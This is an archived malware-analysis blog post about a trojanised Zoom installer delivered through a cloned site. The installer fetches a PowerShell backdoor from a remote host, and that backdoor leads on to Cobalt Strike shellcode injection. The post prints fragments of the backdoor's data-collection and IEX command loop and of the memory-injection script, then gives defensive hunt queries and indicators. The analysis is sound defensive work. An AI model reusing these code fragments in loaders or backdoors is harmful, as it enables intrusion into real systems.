{
    "id": "8485faa7-d10b-4a85-b2b5-22ce3fb3a0b4",
    "created_at": "2023-01-12T15:04:34.761413Z",
    "updated_at": "2025-03-27T02:10:17.898024Z",
    "deleted_at": null,
    "sha1_hash": "407c1b230e8190552e80772f5e9744054d621baf",
    "title": "2021-04-12 - A Different Kind of Zoombomb",
    "authors": "",
    "file_creation_date": "2022-05-27T22:12:37Z",
    "file_modification_date": "2022-05-27T22:12:37Z",
    "file_size": 1643360,
    "plain_text": "# A Different Kind of Zoombomb\n\n**inde.nz/blog/different-kind-of-zoombomb**\n\nOn the 7 April 2021, Defender for Endpoint alerted on suspicious PowerShell execution by a Zoomth\nprocess on a customer workstation:\n\nBesides the fact that Zoom should not be dropping and executing arbitrary PowerShell scripts, this\ninstance of Zoom was launched from a subfolder of %temp% rather than the standard Zoom client\ninstall path under %appdata% (i.e. `C:\\Users\\<user>\\AppData\\Roaming ):`\n\n\n-----\n\nWhat follows is my investigation into the origin of this “aftermarket” Zoom install, and analysis of\nassociated artifacts.\n\n## Delivery\n\nA hunt query showed that Zoom.exe had originated from an 7zip archive produced by a self-extracting\nexecutable: ZoomPortable.exe. In learning this I recalled a conversation with a senior member of\nanother security team who had seen the same set of files in a recent investigation, however the\nexecution they observed did not progress as far as what I was now looking at. Neither of us could find\nany mention of a portable version of Zoom – either official or unofficial – so we worked together to dive\ninto what we believed to be something rather spicy. I would highly recommend taking some time to\n[read their findings too.](https://www.theta.co.nz/news-blogs/cyber-security-blog/pivoting-through-malicious-infrastructure-from-zoomportable-to-windscribe/)\n\nZoomPortable.exe was downloaded from Chrome, as opposed to the more common vector of\ndelivering malware: email. An important attribute of this file is that is signed with a legitimate, DigiCert\nissued certificate:\n\n\n-----\n\nAs Zscaler is used by the organisation, I was able to correlate cloud proxy and endpoint data to\ndetermine that the file had been downloaded from `https[:]//veehy[.]com/download-zoom/`\n(149.56.14[.]50). The site was a perfect clone of zoom[.]us except for the “Download for Free” buttons:\n\n\n-----\n\nPreceding this was a click through `https[:]//linkx[.]ind[.]br/?`\n```\nutm_source=google&utm_medium=cpc&utm_campaign=g&utm_content=506530145240&utm_term=zoom\n\n```\nwhich led to an assumption that the vector for delivery was a Google Ad for Zoom (later corroborated\nby the user).\n\nExecution of ZoomPortable.exe:\n\nConfigures itself to autostart by making a shortcut to itself under\n```\n   %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n```\nDrops zoom.7z in %temp% and extracts its contents into %temp%\\zoom with 7za: `\"7za.exe\" x`\n```\n   \"C:\\Users\\<user>\\AppData\\Local\\Temp\\zoom.7z\" -o\"C:\\Users\\\n   <user>\\AppData\\Local\\Temp\\zoom\" -aos\n\n```\nThe extracted contents appear identical to a standard Zoom client install, with exception of the path\nthey are extracted to and zoom.exe having a modified date much later than any other file:\n\nUnlike its legitimate version, this patched version of Zoom.exe has an idata section that is marked as\nwritable, executable and potentially packed:\n\nThe function at 0x00442000 (the address of .idata) is one of the first called during startup:\n\n\n-----\n\nFurther below, around 0x0044227A, the string \"b.ps1\" is formed:\n\nAfter this is a test of EDX and a conditional jump, so a breakpoint is set here. The user %temp% path\nhas been resolved and a URL is formed:\n\nThe call of EAX invokes Urlmon.URLDownloadToFile, storing the result of `http[:]//ec2-54-209-`\n```\n51-169.compute-1.amazonaws[.]com/awsstat/telemetry.php?t=3&j=<hostname> in C:\\Users\\\n<user>\\AppData\\Local\\Temp\\b.ps1 :\n\n```\n\n-----\n\nUpon successful download of the script a reference to Kernel32.WinExec is stored in ECX and EDX is\npopulated with the shell command required to run the script:\n\nThis command is executed by Kernel32.CreateProcess, launching the PowerShell process via\ncmd.exe:\n\nFrom the perspective of the user, nothing appears out of place: the standard Zoom launcher appears\nfor them:\n\n\n-----\n\n## Execution\n\nExecution of b.ps1 was first seen 6 days after the first run of zoom.exe, suggesting the remote host\nmay have been profiling targets and limiting distribution of the script. In other reported cases, this\ndelay varies between 2-7 days. The initial PowerShell script – b.ps1 – was inspected by AMSI and\nlogged by Defender, and certainly aroused suspicion:\n\n\n-----\n\nKey observations were:\n\nThe use of .NET reflection.\nExtensive obfuscation of variables.\nRandom URI path selection (as used by Cobalt Strike and Empire).\nConnection to an IP unrelated to Zoom infrastructure.\n\nTwo versions of b.ps1 were encountered, each with a unique user agent and set of URI paths:\n\n139.60.161[.]60:\n\n**Paths: /en-us/telemetry/, /en-us/cdn/content, /en-us/info-browser/**\n**User agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0**\n\n\n-----\n\n45.146.164[.]111:\n\n**Paths: /en-us/usage/, /en-us/cdn/content, /en-us/info-user/**\n**User agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/211011011 Firefox/78.0**\n\nThe script was found to operate in stages determined by the response from the remote host. Basic\nuser and system information is first sent to the host in a while loop with a 10 second wait in between\neach iteration:\n\n**User and machine name:**\n\n```\n[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+\n\n```\n```\n[Environment]::MachineName;\n\n```\n**Local IP address:**\n\n```\n(Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select \n```\n```\n   Expand IPAddress);\n\n```\n**Operating system:**\n```\n   (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];\n\n```\n**Process name:**\n```\n   [System.Diagnostics.Process]::GetCurrentProcess();\n\n```\nWhile the response from the host is empty or equal to “exit” the loop will continue, otherwise the\nresponse will form a session ID to be sent in the headers of subsequent requests. Another loop begins\nwith an empty request, presumably to validate the session ID. If it is accepted and the response is\n“xxxxx” the next request will include both the session ID and detail of the execution context:\n```\n([text.encoding]::UTF8).GetBytes(\"Running as user \" + $env:username + \" on \" +\n$env:computername + \"`n`n\" + 'PS ' + (Get-Location).Path + '>')\n\n```\nThis line of code, alongside some others nearby, look to have been borrowed from an open-sourced\nscript, Invoke-PowerShellTcp: https://github.com/tokyoneon/Chimera/blob/master/shells/InvokePowerShellTcp.ps1. It is expected that this is called at least once, and followed by a response that is\nneither empty, “xxxxx” or “exit”. Other valid responses form commands that can be either standalone\nor followed by space separated variables:\n\n**dir:**\n\n**No variables:**\n```\n      Get-ChildItem -force | select mode,@{Name=\"Owner\";Expression={ (Get-Acl\n      $_.FullName).Owner }},lastwritetime,length,name\n\n```\n**With variables:**\n```\n      Get-ChildItem $ca -Force -ErrorAction Stop | select\n      mode,@{Name=\"Owner\";Expression={ (Get-Acl $_.FullName).Owner\n      }},lastwritetime,length,name\n\n```\n**getpid:**\n```\n   [System.Diagnostics.Process]::GetCurrentProcess()\n\n```\n**whoami:**\n\n\n-----\n\n**default:**\n\n**No variables:**\n```\n      IEX $c\n\n```\n**With variables:**\n```\n      IEX \"$c $ca\"\n\n```\nIn effect, the “default” option is used for arbitrary PowerShell execution. This led to multiple additional\ndetections:\n\nIn the following example, a command requests and runs an additional script (where IEX is the alias for\nInvoke-Expression):\n\n[“okm” is a fairly standard shellcode injection script similar to that used in Metasploit and](https://gist.github.com/macostag/f62b688ace243cc7ed426c133ba3efae) [Cobalt Strike:](https://cloud.tencent.com/developer/article/1739261)\n\nConvert hex-encoded shellcode to a byte array:\n\n```\n[Byte[]] $pdas = [byte[]] -split ($bend -replace '..', '0x$& ')\n\n```\n\nAllocate space in memory for the shellcode with VirtualAlloc: `$ufvt.Invoke([IntPtr]::Zero,`\n\n```\n$pdas.Length + 1, 0x3000, 0x40)\n\n```\n\n-----\n\nLoad the shellcode into memory:\n\n```\n[System.Runtime.InteropServices.Marshal]::Copy($pdas, 0, $dotn, $pdas.Length)\n\n```\n\nBuild additional shellcode to invoke “ExitThread”:\n```\n$joas = grqoh kernel32.dll ExitThread\n$dglt = dswro $dotn $joas 64\n\n```\nAlso allocate space for this shellcode and copy it into memory:\n\n```\n$xuwf = $ufvt.Invoke([IntPtr]::Zero, $dglt.Length + 1, 0x3000, 0x40) #\n\n```\n```\n(Reserve|Commit, RWX)\n\n```\n```\n[System.Runtime.InteropServices.Marshal]::Copy($dglt, 0, $xuwf, $dglt.Length)\n\n```\n\nExecute the shellcode as a new thread then exit:\n\n```\n$zcbu.Invoke([IntPtr]::Zero, 0, $xuwf, $dotn, 0, [IntPtr]::Zero)\n\n```\n\n-----\n\nWhen analysing the shellcode, it appeared that the C2 server (95.179.138[.]181:443) had already\nbeen taken down:\n\nThankfully, this\n\nwas detected by Defender as Cobalt Strike, so that at least gave some insight into what the response\nfrom this host likely was (and also avoided tragedy):\n\n\n-----\n\n## What is Cobalt Strike?\n\n[Cobalt Strike (S0154) is commercial software used for adversary emulation and red teaming that has](https://www.cobaltstrike.com/)\nbecome a go-to tool for threat actors. It’s capabilities include:\n\n**Reconnaissance: quietly profile victims and other hosts on the network.**\n**Post-Exploitation: interact with victims through the Beacon console, over VNC or RDP. Run**\ncommands, take screenshots, capture keystrokes, dump credentials from memory, scan the\nlocal network, etc.\n**Covert Communications: malleable Command and Control profiles enable you to blend in with**\nother software used on the network. Transport options include HTTP, HTTPS, DNS and SMB.\n**Phishing: email messages can be imported, weaponised and sent.**\n**Initial Access: web servers can be hosted for drive-by downloads on cloned websites, or a**\nvariety of file payloads can be crafted for external delivery.\n**Browser Pivoting: proxy local browsing through a victim to bypass geofencing, IP allowlisting,**\nmulti-factor authentication and other restrictions.\n\n\n-----\n\nSource:\n\n[https://blog.cobaltstrike.com/2016/09/22/cobalt-strike-3-5-unix-post-exploitation/](https://blog.cobaltstrike.com/2016/09/22/cobalt-strike-3-5-unix-post-exploitation/)\n\n## Recommendations\n\nThis campaign has reinforced the necessity of adopting a defense in depth approach to cybersecurity\n[and investing in best-of-breed security technology. It was only through their adoption of Zscaler cloud](https://www.zscaler.com/)\nproxy and [Microsoft Defender for Endpoint (formerly Defender Advanced Threat Protection) EDR that](https://www.microsoft.com/en-nz/microsoft-365/security/endpoint-defender)\nthe customer managed to come out of this incident unscathed. While execution did occur for some\ntime before initial detection, events that would otherwise have resulted in impact were mitigated.\nTraditional endpoint protection would unlikely have provided adequate coverage and the organisation\nwould be facing a long-term compromise.\n\nAs an analyst it also drove home the importance of industry collaboration, understanding normal OS\nbehaviour and being familiar with the TTP’s of common adversary tooling. Several organisations I\nspoke to who also saw instances of this deemed it a false positive because “it looks and feels like\nZoom”.\n\nUsers of Defender for Endpoint can use the following hunt query to assess their environment for\nindicators of compromise:\n```\nsearch in (DeviceFileEvents, DeviceNetworkEvents) RemoteIP in (\"54[.]209[.]51[.]169\",\n\"139.60.161[.]60\", \"45.146.164[.]111\", \"95.179.138[.]181\") or SHA256 in\n(\"910aed5530f18782d8265d41a2bda49f074dceaff76223e63500a6e4671cfe46\",\n\"fd03b531ad1d8d7358b7b50912841f81b6ea6e4e364ca6af8f0dc61aa7d3d152\",\n\"df8659f990176e4845615486055305a5dc7024c732850bc3043c64e8393dc38b\",\n\"122fc6d2eb88bdce215fd0a379178d66ce816b91b77791d340ff673448d21030\",\n\"ee211bfbd506cb2877ae6f7b1db496ef87bd4462ddcef1ef872798be309dc943\")\n\n```\n**Note: defang IP addresses before running the query.**\n\nImpacted hosts can be further investigated with these queries:\n\n\n-----\n\n```\nlet HostName HOSTNAME ;\nDeviceFileEvents\n| where DeviceName startswith HostName\n| where FileName in (\"1.ps1\", \"b.ps1\", \"zoom.7z\", \"ZoomPortable.exe\")\nlet HostName = \"HOSTNAME\";\nlet ZoomPath = @\"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\zoom\\\";\nsearch in (DeviceFileEvents, DeviceProcessEvents) DeviceName startswith HostName\n| where FolderPath startswith ZoomPath or InitiatingProcessFolderPath startswith ZoomPath\n| where InitiatingProcessFileName != \"7za.exe\" and ActionType !in (\"FileModified\")\nlet HostName = \"HOSTNAME\";\nlet ExecString = \"-exec bypass /W 1\";\nsearch in (DeviceFileEvents, DeviceNetworkEvents, DeviceProcessEvents) DeviceName startswith\nHostName\n| where ProcessCommandLine contains ExecString or InitiatingProcessCommandLine contains\nExecString\n| where FileName !startswith \"__PSScriptPolicyTest\" and RemoteIP != \"127.0.0.1\" and RemoteUrl\n!contains \"zscloud.net\"\nlet HostName = \"HOSTNAME\";\nDeviceEvents\n| where DeviceName startswith HostName\n| where ActionType == \"PowerShellCommand\" and InitiatingProcessCommandLine has_any (\"b.ps1\",\n\"1.ps1\")\n\n```\nYou can find a list of others involved in the investigation and a link to a more comprehensive set of\nIoC’s in the tweet where I first announced this finding:\n[https://twitter.com/phage_nz/status/1379967916116877313.](https://twitter.com/phage_nz/status/1379967916116877313)\n\n## Up Your Game\n\nInde's Managed Detection & Response service equips organisations with industry-leading EDR and\nSIEM that is supported by a team of security experts. Rest easy and be assured that everything is in\ncheck with continual exposure assessment, adversary emulation and detailed reporting. Get in touch\nwith us to learn more.\n\nAbout the author\n\n**Chris Campbell**\n\nChris was that notoriously disobedient kid who sat at the back of the class and always seemed bored,\nbut somehow still managed to ace all of his exams. Obsessed with the finer details and mechanics of\neverything in both the physical and digital realms, Chris serves as the Security Architect within the\nInde Security Team. His ventures into computer security began at an early age and haven't slowed\ndown since. After a decade spent across security and operations, and evenings spent diving into the\ndepths of malware and operating systems, he brings a wealth of knowledge to Inde along with a\nuniquely adversary focused approach to defence. Like many others at Inde, Chris likes to unwind by\nhitting the bike trails or pretending to be a BBQ pitmaster.\n\n**COMMENTS**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-12 - A Different Kind of Zoombomb.pdf"
    ],
    "report_names": [
        "2021-04-12 - A Different Kind of Zoombomb.pdf"
    ],
    "threat_actors": [
        {
            "id": "873a6c6f-a4d1-49b3-8142-4a147d4288ef",
            "created_at": "2022-10-25T16:07:23.455744Z",
            "updated_at": "2025-03-27T02:02:09.811933Z",
            "deleted_at": null,
            "main_name": "Chimera",
            "aliases": [
                "Operation Skeleton Key"
            ],
            "source_name": "ETDA:Chimera",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "SkeletonKeyInjector",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f88b16bc-df4b-48e7-ae35-f4117240ff24",
            "created_at": "2022-10-25T15:50:23.556699Z",
            "updated_at": "2025-03-27T02:00:55.499173Z",
            "deleted_at": null,
            "main_name": "Chimera",
            "aliases": [
                "Chimera"
            ],
            "source_name": "MITRE:Chimera",
            "tools": [
                "PsExec",
                "esentutl",
                "Mimikatz",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535874,
    "ts_updated_at": 1743041417,
    "ts_creation_date": 1653689557,
    "ts_modification_date": 1653689557,
    "files": {
        "pdf": "https://archive.orkl.eu/407c1b230e8190552e80772f5e9744054d621baf.pdf",
        "text": "https://archive.orkl.eu/407c1b230e8190552e80772f5e9744054d621baf.txt",
        "img": "https://archive.orkl.eu/407c1b230e8190552e80772f5e9744054d621baf.jpg"
    }
}